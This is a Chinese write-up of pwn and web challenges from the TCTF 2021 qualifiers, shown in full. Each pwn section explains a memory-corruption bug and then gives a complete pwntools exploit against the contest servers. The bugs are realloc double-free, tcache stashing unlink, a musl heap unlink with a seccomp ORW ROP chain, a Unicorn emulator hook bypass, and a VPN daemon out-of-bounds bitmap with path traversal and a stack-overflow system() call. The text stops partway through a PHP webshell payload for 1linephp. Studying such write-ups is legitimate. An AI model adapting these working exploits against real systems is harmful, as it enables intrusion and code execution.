# TCTF-quals-2021 writeup

## Pwn

### how2mutate

漏洞点在mutate seed函数中

```c
void mutate_seed() {
    char buf[16];
    printf("index: ");
    read(0, buf, 4);
    if (buf[0]>='0' && buf[0]<='9') {
        int idx = buf[0]-'0';
        if (seeds[idx]) {
            run.dynfile->size = seedssz[idx];
            memcpy(run.dynfile->data, seeds[idx], seedssz[idx]);
            mangle_mangleContent(&run, 1);
            seedssz[idx] = run.dynfile->size;
            seeds[idx] = util_Realloc(seeds[idx], seedssz[idx]);
            memcpy(seeds[idx], run.dynfile->data, seedssz[idx]);
        }
    }
}
```

这里的realloc函数的size，也就是seedssz[index]可以为0

```c
void add_seed() {
    int i=0;
    while (i<10 && seeds[i]) i++;
    if (i<10) {
        printf("size: ");
        scanf("%d", &seedssz[i]);
        int sz = seedssz[i]+1;
        if (sz>0 && sz<0x8000) {
            printf("content: ");
            seeds[i] = util_Calloc(sz);
            read(0, seeds[i], seedssz[i]);
        }
    }
}
```

跟进去ida看一下utilrealloc逻辑

```c
void *__fastcall util_realloc(void *ptr, size_t len)
{
  void *v2; // r12

  v2 = realloc(ptr, len);
  if ( !v2 )
  {
    if ( (unsigned int)magic > 1 )
      put_debug_info(2u, "util_Realloc", 0x4Bu, 1, "realloc(%p, %zu)", ptr, len);
    free(ptr);
  }
  return v2;
}
```

这里如果len是0，realloc返回值为0，他再次free就会有个直接的doublefree。

这里注意一下，由于put_debug_info函数会调用localtime相关的函数，第一次调用的时候会打开localtime文件，会调用一个strdup，所以会把上面free掉的chunk拿来用，所以第一次不会触发doublefree，同时他也会把堆地址信息打印出来。

在第二次utilrealloc(ptr,0)的时候就会触发doublefree了，这里面是0x20大小的chunk，tcache直白的doublefree会报错，需要改他的key字段才行，但是现在还没有uaf。

这里需要利用fuzz函数：

```c
   if (buf[0] == '9') {
        bool ok=true;
        for (i=2; i<15; i++) {
            buf[i] += buf[i-1];
            if (buf[i] != buf[i+1])
                ok = false;
        }
        if (ok)
            puts("path 8");
    }
    if (buf[0] == '0') {
        bool ok=true;
        for (i=2; i<15; i++) {
            buf[i] -= buf[i-1];
            if (buf[i] != buf[i+1])
                ok = false;
        }
        if (ok)
            puts("path 9");
    }
```

可以看到如果第一个字节为0或者9就会改变buf中的内容。在主函数中是开启一个线程的方式调用的。

```c
else if (buf[0] == '6') {
            subproc_runThread(&hfuzz, &fuzzthread, tofuzz, false);
```

所以说思路就是利用这个race condition来修改key字段，达到uaf效果。

最开始的思路是先输入个0或者9，然后通过mutate变异，给他size弄成0.后来在调试的时候发现如果size是0了，会出一个noinput异常，不会触发doublefree。

所以改变一下思路，我们先free一个结尾是0x30（也就是字符0）的chunk放到tcache中，然后我们第一次free后fd就被写入了这个地址，然后这时候子线程就会改变fd以及后面的key值，第二次free时候就有uaf了。

有了uaf后就是个极其简单的堆题目了，具体做法就不在这里赘述了。

exp：

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
#context.terminal = ['tmux', 'splitw', '-h']
myelf = ELF("./how2mutate")
#ld    = ELF("./ld-2.30.so")
#libc = ELF('./libc-2.31.so')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
local = True
load_lib = False
io = process(argv = [myelf.path])
'''if not local:
        io = remote('124.16.75.162',31022)
elif load_lib :
        io = process(argv=[ld.path,myelf.path],env={"LD_PRELOAD":'./libc-2.30.so'})
        gdb_text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb_libc_base = int(os.popen("pmap {}| grep libc | awk '{{print $1}}'".format(io.pid)).readlines()[0], 16)
        
else:
        io = process(argv = [myelf.path])#,env={"LD_PRELOAD":'./libc-2.31.so'})
        gdb_text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb_libc_base = int(os.popen("pmap {}| grep libc | awk '{{print $1}}'".format(io.pid)).readlines()[0], 16)
def debug(addr=0,cmd='',PIE=False):
    if PIE: addr = gdb_text_base + addr
    log.warn("breakpoint_addr --> 0x%x" % addr)
    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd)'''
def p():
        gdb.attach(io)
        raw_input()        
def choice(c):
        io.recvuntil('> ')
        io.sendline(str(c))
def add(sz,content):
        choice(1)
        io.recvuntil('size: ')
        io.sendline(str(sz))
        io.recvuntil('content: ')
        io.send(content)
def show():
        choice(3)
        
def delete(index):
        choice(4)
        io.recvuntil('index: ')
        io.sendline(str(index))
def mutate(index):
        choice(2)
        io.recvuntil('index: ')
        io.sendline(str(index))
def setmutate(num):
        choice(5)
        io.recvuntil('mutationsPerRun: ')
        io.sendline(str(num))
def fuzz():
        choice(6)
def exp():
        #
        add(0,'')#0
        #gdb.attach(io,'b fopen')
        setmutate(0)
        mutate(0)

        #
        io.recvuntil('util_Realloc():75 realloc(')
        heapleak = int(io.recv(14),16)
        log.success(hex(heapleak))
        heap_base = heapleak - 0x13a0
        log.success(hex(heap_base))
        
        
        add(0,'')#0
        add(0x480,'/bin/sh\x00')#1
        add(0,'')#2
        
        delete(2)
        fuzz()
        mutate(0)

        target = heap_base + 0x1340
        unsorted = heap_base + 0x1a30 -0x490
        delete(1)
        add(8,p64(target))#0 3tcache remain
        add(8,p64(unsorted))#1 2tcache remain
        add(8,p64(unsorted))#2
        show()

        io.recvuntil('6: ')
        leak = u64(io.recv(6)+b'\x00\x00')
        libc_base = leak - 0x1ebbe0
        sys = libc_base + libc.symbols['system']
        frh = libc_base + libc.symbols['__free_hook']
        log.success(hex(libc_base))

        add(0,'')#3 

        add(0x60,'/bin/sh\x00')#4
        add(0,'')#5

        delete(5)
        fuzz()
        mutate(3)
        add(8,p64(frh))
        add(8,p64(sys))
        add(8,p64(sys))
        delete(4)


        io.interactive()
if __name__ == '__main__':
        io = remote('111.186.59.27', 12345)
        exp()
        while(1):
                try:
                        #io = process(argv = [myelf.path])
                        io = remote('111.186.59.27', 12345)
                        exp()
                except Exception as e:
                        print("failed")
                        io.close()
#flag{ANd_1iK3_7he_cat_I_hAVe_niN3_tiMe5_7o_d1e}
```



### uc_masteeer

通过分析MAIN，得到程序基本流程如下：

- 3个功能的菜单：1. admin test/2. user test/3. patch data
  - admin test ：跳到CODE+0x1000的位置执行代码

- user test ：跳到CODE+0x1000的位置执行代码

- patch data：对任意地址写0xff以内字节的数据

 

admin test和user test看起来一样，但是不同点在于之前的admin_hook， admin_offset的值就是0xdeadbeef066，所以当执行到这里的时候，会发生ADMIN被拷贝到CODE+0x1000然后再去执行，而user test则是直接跳到CODE+0x1000的位置执行。

 

- 0xdeadbeef066会触发admin_hook，ADMIN被拷贝到CODE+0x1000，同时is_admin=True，然后程序跳到CODE+0x1000执行

- 0xdeadbef0028的时候，如果is_admin=True，那么可以触发hook_mem_access，但是地址不可控，同时执行之后is_admin=False

 

所以我们需要做的事情就是既要触发0xdeadbeef066处的admin_hook，但是又不能让程序执行到0xdeadbef0028的位置，然后跳到一个类似这样的位置来完成利用：

```
lea    rax, [k33nlab/readflag's address]
movabs    qword ptr [0xbabecafe233], rax
```

所以一定要在0xdeadbeef066-0xdeadbef0028这段程序执行过程之间来找答案！

注意到程序跳转到CODE+0x1000是通过以下方式：

```
0xdeadbeef087:    movabs    rdi, 0xbabecafe000
0xdeadbeef091:    jmp    qword ptr [rdi]
```

0xbabecafe000是可读可写的栈地址，所以如果我们可以通过patch_data修改了里面的数据，那么就可以让程序不会跳转到CODE+0x1000了

之后我们再patch_data将栈中地址改回CODE+0x1000的位置，同时修改掉CODE+0x1000的代码，将0xdeadbef0053处的值改为"k33nlab/readflag"，然后执行user_test跳转过去就可以了

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"

IP, PORT = "111.186.59.29", 10087

p = remote(IP, PORT)

def patch_data(addr, size, data):
    p.sendlineafter("?: \x00", "3")
    p.sendafter("addr: \x00", p64(addr))
    p.sendafter("size: \x00", p64(size))
    p.sendafter("data: \x00", data)

my_code = b"\x90"
p.send(my_code)

CODE = 0xdeadbeef000
STACK = 0xbabecafe000
patch_data(STACK, 8, p64(CODE))

p.sendlineafter("?: \x00", "1")

patch_data(STACK, 8, p64(CODE+0x1000))
ADMIN = b'\xb9\x10\x00\x00\x00\x48\x8d\x15\x37\x00\x00\x00\x31\xc0\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x08\xe8\x5f\x00\x00\x00\x48\x8d\x05\x2b\x00\x00\x00\x48\xa3\x33\xe2\xaf\xec\xab\x0b\x00\x00\x48\x83\xc4\x08\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08\x49\x6d\x61\x67\x69\x6e\x61\x74\x69\x6f\x6e\x20\x69\x73\x20\x00\x6b\x33\x33\x6e\x6c\x61\x62\x65\x63\x68\x6f\x20\x27\x6d\x6f\x72\x65\x20\x69\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20\x74\x68\x61\x6e\x20\x6b\x6e\x6f\x77\x6c\x65\x64\x67\x65\x2e\x27\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3'.ljust(0x1000, b'\xf4')
payload = ADMIN[:0x53] + b"k33nlab/readflag\x00"
patch_data(CODE+0x1000, len(payload), payload)

p.sendlineafter("?: \x00", "2")

p.interactive()
# flag{Let's_look_forward_to_unicorn2}
```

 

### uc_goood

基本流程和uc_masteeer一致，有一些关键地方做了修改：

```
- uc.mem_write(STACK, p64(CODE + 0x1000) + p64(CODE + 0x2000) + p64(CODE))
+ uc.mem_write(CODE + 0x800, p64(CODE + 0xff0) + p64(CODE + 0x2000) + p64(CODE))
```

CODE+0x800的位置是不可写的位置，所以之前uc_masteeer的方法失效了，不过我们要做的依然是既要触发0xdeadbeef066处的admin_hook，但是又不能让程序执行到0xdeadbef0028的位置

这里是用汇编错位执行的操作，注意到：

```
uc.hook_add(UC_HOOK_CODE, admin_hook, None, admin_offset, admin_offset + 1)
```

所以0xdeadbeef066和0xdeadbeef067都可以触发admin_hook，我们可以输入下面的code，然后利用user test功能跳转过去，之后程序会跳到0xdeadbeef067

```
mov rbx, 0xdeadbeef067;
mov qword ptr [rsp], rbx;
jmp qword ptr [rsp];
```

我这里在代码中加入了很笨的hook代码来观察RIP和RSP，来确保程序真的跳了过去

```
def ctf_hook(uc, address, size, user_data):
    rsp = uc.reg_read(UC_X86_REG_RSP)
    rip = uc.reg_read(UC_X86_REG_RIP)
    print("rip ==> 0x{:x}, rsp ==> 0x{:x}".format(rip, rsp))

uc.hook_add(UC_HOOK_CODE, ctf_hook, None, 1, 0)
```

接下来来看看从0xdeadbeef066和0xdeadbeef067执行的区别：

0xdeadbeef066: 

```
0xdeadbeef066:    mov    ecx, 0x12
0xdeadbeef06b:    lea    rdx, [rip + 0x135]
0xdeadbeef072:    mov    esi, 1
0xdeadbeef077:    xor    eax, eax
```

0xdeadbeef067: 

```
0xdeadbeef067:    adc    al, byte ptr [rax]
0xdeadbeef069:    add    byte ptr [rax], al
0xdeadbeef06b:    lea    rdx, [rip + 0x135]
0xdeadbeef072:    mov    esi, 1
```

看到指令发生了变化，让我们拥有了向一个**相对可控的地址写入一个不可控字节的能力**

同时在admin_hook里加一个print，也可以看到的确执行了admin_hook，所以我们获得了admin_hook将ADMIN代码拷贝到CODE+0x1000之后，再次修改里面代码的资格！！

这里肯定是改CODE+0x1000之后的代码，因为CODE位置是不可写的

之后写了个代码来不断观察发生变化后的ADMIN代码，人工找一下什么时候我们可以有操作空间，只要不断修改下面的offset变量就可以了

```
from pwn import *
from capstone import *

CODE = 0xdeadbeef000
STACK = 0xbabecafe000
admin_offset = CODE + 0x6b - 5

md = Cs(CS_ARCH_X86, CS_MODE_64)
md.detail = True

ADMIN = b'\xb9\x10\x00\x00\x00\x48\x8d\x15\x37\x00\x00\x00\x31\xc0\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x08\xe8\x5f\x00\x00\x00\x48\x8d\x05\x2b\x00\x00\x00\x48\xa3\x33\xe2\xaf\xec\xab\x0b\x00\x00\x48\x83\xc4\x08\x48\xbf\x00\xf8\xee\xdb\xea\x0d\x00\x00\xff\x67\x08\x49\x6d\x61\x67\x69\x6e\x61\x74\x69\x6f\x6e\x20\x69\x73\x20\x00\x6b\x33\x33\x6e\x6c\x61\x62\x65\x63\x68\x6f\x20\x27\x6d\x6f\x72\x65\x20\x69\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20\x74\x68\x61\x6e\x20\x6b\x6e\x6f\x77\x6c\x65\x64\x67\x65\x2e\x27\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3'.ljust(0x1000, b'\xf4')
print("length of ADMIN => ", len(ADMIN))

# 0xdeadbeef067:    adc    al, byte ptr [rax]
# 0xdeadbeef069:    add    byte ptr [rax], al
# 0x2d pushfq
offset = 0
rax = 0xdeadbef0000 + offset

al = ((rax&0xff) + ADMIN[offset])&0xff
print(hex(al), hex(ADMIN[offset]))

rax2 = (0xdeadbef0000 & 0xfffffffff00)+al
print(hex(rax2))

if rax2 > (0xdeadbef0000+0x32):
    if rax2 not in range(0xdeadbef0000+0x80, 0xdeadbef0000+0x9b):
        print("-----nonono-----")
        exit()
    
tmp = bytearray(ADMIN)
tmp[rax2-0xdeadbef0000] = (tmp[rax2-0xdeadbef0000]+al)&0xff
ADMIN = bytes(tmp)
#print(al, ADMIN[offset])


print("---------- ADMIN CODE ----------")
for i in md.disasm(ADMIN[:0x45], CODE+0x1000):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))

print()
for i in md.disasm(ADMIN[0x80:0x9a], CODE+0x1000+0x80):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))

print(hex(rax2))
```

offset=0x9a的时候，我发现了可以操作的点，此时的ADMIN代码被修改为：

```
0xdeadbef0000:    mov    ecx, 0x10
0xdeadbef0005:    lea    rdx, [rip + 0x37]
0xdeadbef000c:    xor    eax, eax
0xdeadbef000e:    mov    esi, 1
0xdeadbef0013:    mov    edi, 1
0xdeadbef0018:    sub    rsp, 8
0xdeadbef001c:    call    0xdeadbef0080
0xdeadbef0021:    lea    rax, [rip + 0x2b]
0xdeadbef0028:    movabs    qword ptr [0xbabecafe233], rax
0xdeadbef0032:    add    rsp, 8
0xdeadbef0036:    movabs    rdi, 0xdeadbeef800
0xdeadbef0040:    jmp    qword ptr [rdi + 8]
0xdeadbef0043:    insd    dword ptr [rdi], dx

0xdeadbef0080:    mov    rax, rdi
0xdeadbef0083:    mov    rdi, rsi
0xdeadbef0086:    mov    rsi, rdx
0xdeadbef0089:    mov    rdx, rcx
0xdeadbef008c:    mov    qword ptr [r8 + 0x4d], r10
0xdeadbef0090:    mov    eax, ecx
0xdeadbef0092:    mov    r9, qword ptr [rsp + 8]
0xdeadbef0097:    syscall    
0xdeadbef0099:    ret    
```

注意此时的syscall里面的0xdeadbef008c位置有惊喜，是不是和0xdeadbef0028的功能一样，并且r8和r10程序中没有用，所以我们可以在user test的时候给r8和r10赋值，这样就可以让r10指向一处为"k33nlab/readflag"的位置再触发后门了！！

 

还有一点，不要忘记了，虽然r10和r8没有用，但是在正常的系统调用的时候，值发生了一点小变化：

```
0xdeadbef0080:    mov    rax, rdi
0xdeadbef0083:    mov    rdi, rsi
0xdeadbef0086:    mov    rsi, rdx
0xdeadbef0089:    mov    rdx, rcx
0xdeadbef008c:    mov    r10, r8
0xdeadbef008f:    mov    r8, r9
0xdeadbef0092:    mov    r9, qword ptr [rsp + 8]
0xdeadbef0097:    syscall    
0xdeadbef0099:    ret
```

所以实际上我们修改的是r8和r9

最后我们的利用思路总结如下：

- 在STACK中写下k33nlab/readflag的值

- rax = 0xdeadbef0000+0x9a，来构造出0xdeadbef008c的代码

- 对r8，r9赋值，实际上就是对r10，r8赋值，使其满足mov  qword ptr [r8 + 0x4d], r10 ⇒ mov  qword ptr [0xbabecafe233], k33nlab/readflag's address

- 用user test跳转到0xdeadbeef067的位置，错位执行



```
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"

IP, PORT = "111.186.59.29", 10088

p = remote(IP, PORT)

def patch_data(addr, size, data):
    p.sendlineafter("?: \x00", "3")
    p.sendafter("addr: \x00", p64(addr))
    p.sendafter("size: \x00", p64(size))
    p.sendafter("data: \x00", data)

idx = 0x9a
my_code = asm('''
    mov rax, {};
    mov r9, 0xbabecafe1e6;
    mov r8, 0xbabecafe000;
    mov rbx, 0xdeadbeef067;
    mov qword ptr [rsp], rbx;
    jmp qword ptr [rsp];
'''.format(0xdeadbef0000+idx))

p.send(my_code)


CODE = 0xdeadbeef000
STACK = 0xbabecafe000

payload = b"k33nlab/readflag\x00"
patch_data(STACK, len(payload), payload)


p.sendlineafter("?: \x00", "2")

p.interactive()
#flag{Hope_you_enjoyed_the_series}
```

### listbook

漏洞点：

abs的漏洞，不过这次是abs8，当参数为0x80时可以uaf

利用思路：

1. 题目吧chunk大小限制死了，tacahe有double free tcache2的检测只能在small bin上做文章
2. Tcache stashing unlink+：在smallbin中先放置5个chunk，free掉一个有两个指针控制的chunk ,用另一个指针uaf
3. 2中的要求：后在不破坏fd的情况下将后放入smallbin的chunk的bk设置为目标地址-0x10。同时要令目标地址+8中的值是一个指向一处可写内存的指针。

EXP:

```
from pwn import *
context.arch='amd64'
def cmd(c):
    p.sendlineafter(">>",str(c))def add(name='\n',c='A\n'):
    cmd(1)
    p.sendafter(">",name)
    p.sendafter(">",c)def free(idx):
    cmd(2)
    p.sendlineafter(">",str(idx))def show(idx):
    cmd(3)
    p.sendlineafter(">",str(idx))#p=process("./pwn")
p=remote("111.186.58.249",20001)#context.log_level='debug'
context.terminal=['tmux','split','-h']
add()
add("\x10"*0x10)
show(0)
p.readuntil(b"\x10"*0x10)
heap=u64(p.readuntil(" ")[:-1]+b'\0\0')-(0x2a0)
log.warning(hex(heap))
free(0)
add()
add("\1\n")
add("\2\n")for x in range(7):
    add('\6\n')
free(6)
free(2)
free(0)
add('\x80\n')
show(0)
p.readuntil("=> ")
base=u64(p.readline()[:-1]+b'\0\0')-(0x7ffff7fbade0-0x7ffff7dcf000)
log.warning(hex(base))for x in range(6):
    add('\2\n')
add('\7\n')#*
for x in range(3):
    add('\6\n')for x in range(8):
     add('\4\n')for x in range(7):
    add('\3\n')
free(3)
free(4)
free(7)for x in range(6):
    add('\2\n')for x in range(3):
    add('\4\n')
    free(4)
add('\4\n')
free(0)
add('\n',p64(0x000055555555afd0-0x555555559000+heap)+p64(0x5555555592b0-0x10-0x555555559000+heap)+b'\n')
add('\2\n')
add('\0\n',b'\0'*0x18+p64(0x21)+p64(base+0x1eeb20)+b'\n')
add()
add('\0\n',b'/bin/sh\0'+p64(base+0x55410)+b'\n')
free(0)
p.interactive()
```

### babyheap2021

漏洞点：

edit处大小比较有问题可以用0x80000000来造成溢出。

利用思路：

1. 先泄露因为musl堆和libc同一个base，可以通过overlap已经在使用的chunk来泄露
2. musl heap的unlink没有检查，可以链入任意地址来写
3. 写stdin之后call exit就可以触发offset =0x48和0x50的函数指针
4. 因为开了seccomp所以要orw，因为七号rbp是stdin，所以可以leave ret+rop
5. 有个坑就是reomote时候 stdin有些地方会在readflag的时候变动，可以sub rsp来绕过

Exp:

```
from pwn import *#context.log_level='debug'
context.arch='amd64'
context.terminal=['tmux','split','-h']
def cmd(c):
    p.sendlineafter(": ",str(c))
def add(size,c='A'):
    cmd(1)
    cmd(size)
    if(size):
        p.sendlineafter(": ",c)
def edit(idx,size,c="A"*1):
    cmd(2)
    cmd(idx)
    cmd(size)
    if(size):
        p.sendlineafter(": ",c)
def free(idx):
    cmd(3)
    cmd(idx)
def show(idx):
    cmd(4)
    cmd(idx)#p=process('./pwn')
p=remote("111.186.59.11",11124)
add(0x10)#0
add(0x10)#1
add(0x70)#2
add(0x10)#3
edit(0,0x80000000,b"A"*0x10+p64(0x21)+p64(0x81)+b'\0'*0x70+p64(0x81)+p64(0x21)*4+p64(0x21)[:-1])
free(1)
add(0x10)#1
show(2)p.readuntil(": ")
base=u64(p.read(8))-(0x7ffff7ffba70-0x7ffff7f4b000)
log.warning(hex(base))#0x7ffff7ffba80
add(0x50)#4
puts=0x7ffff7fa9ed0-0x7ffff7f4b000+base

add(0x10)#5689
add(0x10)#6
add(0x10)#7
add(0x10)#8
add(0x10)#9
free(6)
free(8)
victim=0x00007ffff7ffb170-0x7ffff7f4b000+base
bin_addr=0x00007ffff7ffba40-0x7ffff7f4b000+baseedit(5,0x80000000,b"A"*0x10+p64(0x21)+p64(0x20)+p64(bin_addr)+p64(victim)+p64(0x20)[:-1])
add(0x10)#6
edit(5,0x80000000,b"A"*0x10+p64(0x21)+p64(0x20)+p64(victim)+p64(bin_addr)+p64(0x20)[:-1])
add(0x10)#8
add(0x10)#10


leave=0x0000000000016992+base
yyds=0x7ffff7fa9b30-0x7ffff7f4b000+base
add10=0x0000000000078aea+base
ret=0x7ffff7f61993-0x7ffff7f4b000+base
rax=0x0000000000016a16+base
rdi=0x0000000000015291+base
rsi=0x000000000001d829+base
rdx=0x000000000002cdda+base
system=323456+base
sys=0x7ffff7f94899-0x7ffff7f4b000+base
payload=b'/flag\0\0\0'+p64(rax)+p64(2)+p64(sys)+p64(rax)+p64(0)+p64(rsi)+p64(victim-0x100)+p64(add10)+p64(leave)+p64(0xbadbabe)
test=0x0000000000078aea+base
payload+=p64(rdi)+p64(3)+p64(rdx)+p64(0x100)+p64(test)#payload+=p64(rdi)+p64(3)+p64(rsi)+p64(victim+0x10)+p64(test)
#payload+=p64(0)*2+p64(rdx)+p64(0x100)+p64(rax)+p64(1)+p64(rdi)+p64(1)+p64(sys)
payload+=p64(0)*2+p64(sys)+p64(rdi)+p64(1)+p64(rax)+p64(1)+p64(sys)
#payload=b'/bin/sh\0'+p64(rax)+p64(2)+p64(sys)+p64(rax)+p64(0)+p64(rdi)+p64(victim+0x10)+p64(add10)+p64(leave)+p64(0xbadbabe)+p64(ret)*1+p64(puts)
print(len(payload))
edit(10,0x80000000,payload)#gdb.attach(p,'b *0x7ffff7fa5c4b')
cmd(5)
p.interactive()
```

### IOA



先用urlencode绕目录穿越的过滤，读到user.txt里的用户名密码，用账号密码登录。

然后用vip bitmap操作的负数下标越界访问到bss上的内容。读master_key，改dhcp_pool，用req_vip的整数截断leak canary，在req_vip里栈溢出。

```
from pwn import *

context.log_level = 'debug'


def login():
    p = remote('111.186.58.249', 32766, ssl=True)

    content = b'name=rea1user&passwd=re4lp4ssw0rd'
    total = len(content)
    raw = b''
    raw += b'POST /login HTTP/1.1\r\n'
    raw += b'Content-Length: ' + str(total).encode('ascii') + b'\r\n'
    raw += b'\r\n'
    raw += content

    p.send(raw)

    p.recvuntil(b'login success')
    return p

def wrap1(data):
    return p32(0xDEADBEEF) + p16(len(data) + 6, endian='big') + data

def wip(a, b, c, d):
    return p8(a) + p8(b) + p8(c) + p8(d)

def check_vip(p, val):
    p.send(wrap1(p16(3) + p32(val, endian = 'big')))
    buf = p.recvn(0xC)
    return u32(buf[-4:])

def req_vip(p, val):
    p.send(wrap1(p16(1) + p32(val, endian = 'big')))
    assert p.recvn(4) == p32(0xDEADBEEF)
    buf = p.recvn(2)
    assert p.recvn(2) == p16(1)

    sz = u16(buf, endian='big')
    buf = p.recvn(sz - 8)
    
    return buf[16:]

def kickout(p, val, key):
    p.send(wrap1(p16(4) + p32(val, endian = 'big') + key))
    buf = p.recvn(0xC)
    return u32(buf[-4:])



progbase = 0x5650d5f47000

# delta = heap abs addr - progbase
delta = 0x5650d7d95640 - progbase
print(hex(delta))


prog = ELF('./sslvpnd')

def calc_off(addr):
    off = (delta - (addr - prog.address)) * 8
    return off

key_off = calc_off(prog.sym['master_key'])

master = login()

baseip = u32(wip(172, 31, 0, 0), endian = 'big')

out = 0
for i in range(0x40):
    r = check_vip(master, baseip - key_off + i)
    out |= (r ^ 1) << i

key = p64(out)
print(key.hex())
master_key = key


tworkers = []

# write dhcp_pool.cnt to negative
off = calc_off(prog.sym['dhcp_pool'] + 0x18)
buf = 0x80000021
ori = 1

for i in [31, 5]:
    kickout(master, baseip - off + i, master_key)



# leak stack
t = login()
buf = req_vip(t, baseip + 3)
tworkers.append(t)

canary = buf[0x80:0x80 + 8]
print(canary.hex())



# fixup
for i in [5, 31]:
    t = login()
    req_vip(t, baseip - off + i)
    tworkers.append(t)



def write_buf(off, buf, old = None):
    if old is None:
        old = bytes(len(buf))

    for i in range(len(buf)):
        for j in range(8):
            a = (buf[i] >> j) & 1   
            b = (old[i] >> j) & 1  
            o = baseip - off + (i * 8 + j)
            if a != b:
                if a == 1 and b == 0:
                    kickout(master, o, master_key)
                else:
                    t = login()
                    req_vip(t, o)
                    tworkers.append(t)


write_buf(calc_off(0x10600), b'./getflag>/tmp/swtql')

def g(t):
    t = t[0:4][::-1] + t[4:8][::-1]
    return t

pop_rdi = progbase + 0xCAC3
ret = progbase + 0xCAC4
command = progbase + 0x10600
system_plt = progbase + (prog.plt['system'] - prog.address)
write_buf(calc_off(0x10640), g(canary) + g(p64(pop_rdi)) + g(p64(command)) + g(p64(ret)) + g(p64(system_plt)))


pad = p64(progbase)
buf = b''
buf += pad * 16 + p64(progbase + 0x10640)
buf += pad * 3 + p64(progbase + 0x10640 + 8) + p64(progbase + 0x10640 + 0x10) + p64(progbase + 0x10640 + 0x18) + p64(progbase + 0x10640 + 0x20)

write_buf(calc_off(prog.sym['dhcp_pool'] + 0x20 + 8), buf)

off = calc_off(prog.sym['dhcp_pool'] + 0x18)
write_buf(off, p32(0x19), p32(1))

req_vip(master, baseip + 10)
```



```
from pwn import *

context.log_level = 'debug'

p = remote('111.186.58.249', 32766, ssl=True)

path = '../user.txt'
path = '../../tmp/swtql'

uri = urlencode(path).encode('ascii')
raw = b''
raw += b'''GET ''' + uri + b''' HTTP/1.1\r\n'''
raw += b'\r\n'

p.send(raw)
out = p.recvall()
out = out.partition(b'\r\n\r\n')[-1]
open('out', 'wb').write(out)
```



Leak坑在于远程堆layout不同

```
# leak.py
from pwn import *

debug = 0


def login() -> remote:
    if debug:
        p = remote('127.0.0.1', 443, ssl=True, level='error')
    else:
        p = remote('111.186.58.249', 36717, ssl=True, level='error')
    data = 'name=rea1user&passwd=re4lp4ssw0rd'
    packet = f'''POST /login HTTP/1.1
Content-Length: {len(data)}

{data}'''.replace('\n', '\r\n')
    p.send(packet)
    p.recvuntil('success')
    return p


def wrap(data):
    return p32(0xdeadbeef) + p16(len(data) + 6, endian='big') + data


def check_vip(p, val, pack_only=False):
    packet = wrap(p16(3) + p32(val, endian='big'))
    if not pack_only:
        p.send(packet)
        buf = p.recvn(0xC)
        return u32(buf[-4:])
    else:
        return packet


def req_vip(p, val, pack_only=False):
    packet = wrap(p16(1) + p32(val, endian='big'))
    if not pack_only:
        p.send(packet)
        buf = p.recvn(4)
        buf = p.recvn(2)
        sz = u16(buf, endian='big')
        buf = p.recvn(sz - 6)

        return u32(buf[2:6])
    else:
        return packet


def ip2long(ip):
    """
    Convert an IP string to long
    """
    packedIP = socket.inet_aton(ip)
    return struct.unpack("!L", packedIP)[0]


def leak(p, off, sz=8):
    data = []
    off <<= 3
    packets = b''
    for i in range(0, sz * 8, 8):
        # out = 0
        for j in range(8):
            packets += check_vip(p, base - i - j - 1 - off, pack_only=True)

    p.send(packets)
    for i in range(0, sz * 8, 8):
        out = 0
        for j in range(8):
            buf = p.recvn(0xC)
            r = u32(buf[-4:])
            out <<= 1
            out |= r ^ 1
        data.append(out)
    return bytearray(data)


def kickout(p, val):
    global mkey
    p.send(wrap(p16(4) + p32(val, endian='big') + mkey))
    buf = p.recvn(0xC)
    return u32(buf[-4:])

m = login()
base = ip2long('172.31.0.0')
crash_first = True
if crash_first:
    try:
        check_vip(m, base - 0xffffff)  # force restart
    except:
        m.close()

    m = login()

if debug:
    heap_param = 15
    heap = 0
    cb = 0x5651eaa9f000
else:
    heap_param = 33
    heap = 0
    cb = 0
if not heap:
    # for x in range(0x100):
    data = leak(m, heap_param * 16, 8)
    heap = u64(data[:8], endian='big') + 0xc0 + (heap_param - 15) * 0x10

log.success(f'heap: 0x{heap:x}')

if not cb:
    heap_off = heap & 0xffff
    t = 3
    pro = log.progress('Leaking base...')
    while True:
        try:
            t += 1
            tmp = login()
            pro.status(f'Try {t}...')
            off = heap_off + 0x10000 * t
            off <<= 3
            check_vip(tmp, base - off)
            pro.success(f'Try {t}...success')
            cb = heap - heap_off - 0x10000 * t
            break
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pro.status(f'Try {t}...Fail')
        finally:
            tmp.close()

    pro = log.progress('Leaking accurate base...')
    heap_off = heap - cb
    t = 0
    while True:
        try:
            tmp = login()
            pro.status(f'Try {t}...')
            off = heap_off + 0x1000 * t
            t += 1
            off <<= 3
            check_vip(tmp, base - off)
            pro.status(f'Try {t}...Fail')
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pro.success(f'Try {t}...success')
            cb = heap - heap_off - 0x1000 * t
            break
        finally:
            tmp.close()
    cb += 0x2000
    log.success(f'base: 0x{cb:x}')

w = login()
pprint(leak(w, heap - cb - 8))
m.interactive()
```

## Web

### 1linephp

调整 Zip 偏移，使其开头能够包含 upload_progress_

PHP_SESSION_UPLOAD_PROGRESS 上传 + 文件包含漏洞 进行条件竞争。

完整的 EXP：

```
#encoding:utf-8
import io
import requests
import threading
from pwn import *
import os, sys

cmd = '''whoami'''

poc = '''@<?php
echo "evoA yyds";
system('%s');
